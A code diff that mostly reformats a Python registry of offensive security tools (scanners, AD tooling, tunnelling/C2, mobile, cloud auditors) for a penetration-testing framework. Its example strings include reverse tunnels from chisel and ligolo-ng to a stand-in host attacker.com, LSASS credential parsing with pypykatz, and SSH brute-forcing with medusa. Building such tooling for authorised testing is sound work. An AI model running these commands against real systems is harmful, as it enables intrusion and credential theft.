@@ -30,7 +30,6 @@ from __future__ import annotations
 
 from decepticon.arsenal.registry import ArgSchema, ToolSpec
 
-
 REGISTRY_EXTRAS: list[ToolSpec] = [
     # ──────── web (more) ────────
     ToolSpec(
@@ -43,7 +42,13 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
             ArgSchema("port", int, flag="-p"),
             ArgSchema("ssl", bool, flag="-ssl"),
             ArgSchema("output", str, flag="-o"),
-            ArgSchema("format", str, flag="-Format", default="json", choices=["csv", "htm", "json", "txt", "xml"]),
+            ArgSchema(
+                "format",
+                str,
+                flag="-Format",
+                default="json",
+                choices=["csv", "htm", "json", "txt", "xml"],
+            ),
             ArgSchema("tuning", str, flag="-Tuning", description="1-9,b,c,x"),
         ],
         examples=["nikto -h https://target.com -o /tmp/nikto.json -Format json"],
@@ -72,7 +77,13 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         description="WordPress vulnerability scanner — plugins, themes, users, version-CVE matching.",
         args=[
             ArgSchema("url", str, flag="--url", required=True),
-            ArgSchema("enumerate", str, flag="--enumerate", default="vp,vt,u", description="vp=vuln-plugins, vt=vuln-themes, u=users, ap=all-plugins"),
+            ArgSchema(
+                "enumerate",
+                str,
+                flag="--enumerate",
+                default="vp,vt,u",
+                description="vp=vuln-plugins, vt=vuln-themes, u=users, ap=all-plugins",
+            ),
             ArgSchema("api_token", str, flag="--api-token"),
             ArgSchema("output", str, flag="--output"),
             ArgSchema("format", str, flag="--format", default="json"),
@@ -86,7 +97,12 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         category="web",
         description="Dir / vhost / DNS / fuzz brute-forcer in Go. Faster than ffuf for some workloads.",
         args=[
-            ArgSchema("subcommand", str, required=True, choices=["dir", "dns", "fuzz", "vhost", "s3", "gcs"]),
+            ArgSchema(
+                "subcommand",
+                str,
+                required=True,
+                choices=["dir", "dns", "fuzz", "vhost", "s3", "gcs"],
+            ),
             ArgSchema("url", str, flag="-u"),
             ArgSchema("wordlist", str, flag="-w", required=True),
             ArgSchema("threads", int, flag="-t", default=50),
@@ -119,7 +135,9 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         category="recon",
         description="OWASP Amass — deep subdomain enumeration via 100+ sources.",
         args=[
-            ArgSchema("subcommand", str, required=True, choices=["enum", "intel", "viz", "track", "db"]),
+            ArgSchema(
+                "subcommand", str, required=True, choices=["enum", "intel", "viz", "track", "db"]
+            ),
             ArgSchema("domain", str, flag="-d"),
             ArgSchema("passive", bool, flag="-passive"),
             ArgSchema("active", bool, flag="-active"),
@@ -149,7 +167,9 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         category="recon",
         description="Headless-Chromium-driven screenshot tool for web hosts.",
         args=[
-            ArgSchema("subcommand", str, required=True, choices=["single", "file", "nmap", "report"]),
+            ArgSchema(
+                "subcommand", str, required=True, choices=["single", "file", "nmap", "report"]
+            ),
             ArgSchema("url", str, flag="--url"),
             ArgSchema("file", str, flag="--file"),
             ArgSchema("output_dir", str, flag="--screenshot-path", default="screenshots"),
@@ -182,7 +202,9 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         args=[
             ArgSchema("domain", str, description="Positional"),
             ArgSchema("subs", bool, flag="--subs"),
-            ArgSchema("providers", str, flag="--providers", default="wayback,otx,commoncrawl,urlscan"),
+            ArgSchema(
+                "providers", str, flag="--providers", default="wayback,otx,commoncrawl,urlscan"
+            ),
             ArgSchema("output", str, flag="-o"),
         ],
         examples=["gau target.com --subs -o urls.txt"],
@@ -208,7 +230,9 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         description="HTTP parameter discovery — finds hidden GET/POST params via wordlist + behavior diff.",
         args=[
             ArgSchema("url", str, flag="-u", required=True),
-            ArgSchema("method", str, flag="-m", default="GET", choices=["GET", "POST", "JSON", "XML"]),
+            ArgSchema(
+                "method", str, flag="-m", default="GET", choices=["GET", "POST", "JSON", "XML"]
+            ),
             ArgSchema("output", str, flag="-oJ"),
             ArgSchema("threads", int, flag="-t", default=2),
         ],
@@ -307,7 +331,6 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         examples=["python3 SecretFinder.py -i https://target.com/static/app.js -o results.html"],
         install_hint="git clone https://github.com/m4ll0k/SecretFinder.git",
     ),
-
     # ──────── AD (more) ────────
     ToolSpec(
         name="evil-winrm",
@@ -410,7 +433,9 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
             ArgSchema("filter", str, description="Positional after -b"),
             ArgSchema("attrs", str, description="Positional after filter"),
         ],
-        examples=["ldapsearch -x -H ldap://10.0.0.5 -D 'alice@corp' -w 'Pass!' -b 'dc=corp,dc=local'"],
+        examples=[
+            "ldapsearch -x -H ldap://10.0.0.5 -D 'alice@corp' -w 'Pass!' -b 'dc=corp,dc=local'"
+        ],
         install_hint="apt install ldap-utils",
     ),
     ToolSpec(
@@ -435,7 +460,9 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         category="ad",
         description="Pure-python Mimikatz — parse LSASS dumps, SAM, NTDS for credentials.",
         args=[
-            ArgSchema("subcommand", str, required=True, choices=["lsa", "registry", "dpapi", "kerberos"]),
+            ArgSchema(
+                "subcommand", str, required=True, choices=["lsa", "registry", "dpapi", "kerberos"]
+            ),
             ArgSchema("operation", str, description="Positional, e.g. 'minidump'"),
             ArgSchema("input", str, description="Positional path to dump file"),
             ArgSchema("output", str, flag="-o"),
@@ -443,7 +470,6 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         examples=["pypykatz lsa minidump /tmp/lsass.dmp"],
         install_hint="pipx install pypykatz",
     ),
-
     # ──────── Tunneling / C2 ────────
     ToolSpec(
         name="chisel",
@@ -452,12 +478,19 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         description="HTTP-tunneled TCP/UDP forwarder — pivot through HTTP-only egress.",
         args=[
             ArgSchema("mode", str, required=True, choices=["server", "client"]),
-            ArgSchema("bind_url", str, description="Positional, e.g. '0.0.0.0:8080' or 'attacker.com:8080'"),
+            ArgSchema(
+                "bind_url",
+                str,
+                description="Positional, e.g. '0.0.0.0:8080' or 'attacker.com:8080'",
+            ),
             ArgSchema("forward", str, description="Positional, e.g. 'R:8888:127.0.0.1:5432'"),
             ArgSchema("reverse", bool, flag="--reverse"),
             ArgSchema("auth", str, flag="--auth"),
         ],
-        examples=["chisel server --reverse --port 8080", "chisel client --auth user:pw attacker.com:8080 R:9999:internal:80"],
+        examples=[
+            "chisel server --reverse --port 8080",
+            "chisel client --auth user:pw attacker.com:8080 R:9999:internal:80",
+        ],
         install_hint="go install github.com/jpillora/chisel@latest",
     ),
     ToolSpec(
@@ -471,7 +504,10 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
             ArgSchema("listen", str, flag="-laddr"),
             ArgSchema("connect", str, flag="-connect"),
         ],
-        examples=["ligolo-ng proxy -selfcert -laddr 0.0.0.0:11601", "ligolo-ng agent -connect attacker.com:11601 -ignore-cert"],
+        examples=[
+            "ligolo-ng proxy -selfcert -laddr 0.0.0.0:11601",
+            "ligolo-ng agent -connect attacker.com:11601 -ignore-cert",
+        ],
         install_hint="go install github.com/nicocha30/ligolo-ng/cmd/proxy@latest",
     ),
     ToolSpec(
@@ -480,7 +516,12 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         category="tunneling",
         description="Bidirectional data relay — TCP/UDP/UNIX/PTY/EXEC bridges.",
         args=[
-            ArgSchema("source", str, required=True, description="Positional, e.g. 'TCP-LISTEN:8888,reuseaddr,fork'"),
+            ArgSchema(
+                "source",
+                str,
+                required=True,
+                description="Positional, e.g. 'TCP-LISTEN:8888,reuseaddr,fork'",
+            ),
             ArgSchema("destination", str, required=True, description="Positional"),
         ],
         examples=["socat TCP-LISTEN:8888,reuseaddr,fork TCP:internal:80"],
@@ -499,7 +540,6 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         examples=["proxychains4 -q nmap -sT 10.10.10.5"],
         install_hint="apt install proxychains4",
     ),
-
     # ──────── Mobile (more) ────────
     ToolSpec(
         name="frida",
@@ -522,7 +562,12 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         category="mobile",
         description="Frida-based runtime mobile-app explorer — REPL w/ built-in jailbreak/root/SSL-pin bypass.",
         args=[
-            ArgSchema("subcommand", str, required=True, choices=["explore", "patchapk", "patchipa", "signapk"]),
+            ArgSchema(
+                "subcommand",
+                str,
+                required=True,
+                choices=["explore", "patchapk", "patchipa", "signapk"],
+            ),
             ArgSchema("gadget", str, flag="-g"),
             ArgSchema("startup_command", str, flag="-s"),
         ],
@@ -561,7 +606,9 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         category="mobile",
         description="Android SDK APK analyzer — manifest, dex stats, size, resources.",
         args=[
-            ArgSchema("subcommand", str, required=True, description="Positional, e.g. 'manifest print'"),
+            ArgSchema(
+                "subcommand", str, required=True, description="Positional, e.g. 'manifest print'"
+            ),
             ArgSchema("apk", str, description="Positional"),
         ],
         examples=["apkanalyzer manifest print target.apk"],
@@ -573,13 +620,14 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         category="mobile",
         description="Android IPC security framework — content-provider + intent + activity attacks.",
         args=[
-            ArgSchema("subcommand", str, required=True, choices=["console", "agent", "module", "server"]),
+            ArgSchema(
+                "subcommand", str, required=True, choices=["console", "agent", "module", "server"]
+            ),
             ArgSchema("operation", str, description="Positional, e.g. 'connect'"),
         ],
         examples=["drozer console connect"],
         install_hint="pip install drozer",
     ),
-
     # ──────── Cloud (more) ────────
     ToolSpec(
         name="pacu",
@@ -600,7 +648,9 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         category="cloud",
         description="Multi-cloud security auditing — AWS/Azure/GCP/Aliyun config + IAM review.",
         args=[
-            ArgSchema("provider", str, required=True, choices=["aws", "azure", "gcp", "aliyun", "oci"]),
+            ArgSchema(
+                "provider", str, required=True, choices=["aws", "azure", "gcp", "aliyun", "oci"]
+            ),
             ArgSchema("report_dir", str, flag="--report-dir"),
             ArgSchema("profile", str, flag="--profile"),
         ],
@@ -627,9 +677,13 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         category="cloud",
         description="Prowler — CIS-benchmark-aligned cloud security auditor. AWS/Azure/GCP/Kubernetes.",
         args=[
-            ArgSchema("provider", str, required=True, choices=["aws", "azure", "gcp", "kubernetes"]),
+            ArgSchema(
+                "provider", str, required=True, choices=["aws", "azure", "gcp", "kubernetes"]
+            ),
             ArgSchema("checks", str, flag="-c"),
-            ArgSchema("output_format", str, flag="-M", default="json", choices=["json", "csv", "html"]),
+            ArgSchema(
+                "output_format", str, flag="-M", default="json", choices=["json", "csv", "html"]
+            ),
             ArgSchema("output_dir", str, flag="-o"),
         ],
         examples=["prowler aws -M json -o /tmp/prowler"],
@@ -649,7 +703,6 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         examples=["kube-bench run --benchmark cis-1.7"],
         install_hint="https://github.com/aquasecurity/kube-bench (binary release)",
     ),
-
     # ──────── Crypto/utility (more) ────────
     ToolSpec(
         name="cyberchef-cli",
@@ -695,7 +748,6 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         examples=["medusa -h 10.0.0.5 -U users.txt -P rockyou.txt -M ssh -t 4"],
         install_hint="apt install medusa",
     ),
-
     # ──────── RE / pwn extras ────────
     ToolSpec(
         name="pwntools-cli",
@@ -703,7 +755,12 @@ REGISTRY_EXTRAS: list[ToolSpec] = [
         category="re",
         description="pwn CLI utilities — checksec, disasm, hex, shellcraft, libcdb.",
         args=[
-            ArgSchema("subcommand", str, required=True, description="checksec / disasm / hex / shellcraft / libcdb / cyclic / ..."),
+            ArgSchema(
+                "subcommand",
+                str,
+                required=True,
+                description="checksec / disasm / hex / shellcraft / libcdb / cyclic / ...",
+            ),
             ArgSchema("args", str, multi=True, description="Subcommand args"),
         ],
         examples=["pwn checksec /tmp/binary", "pwn cyclic 100"],
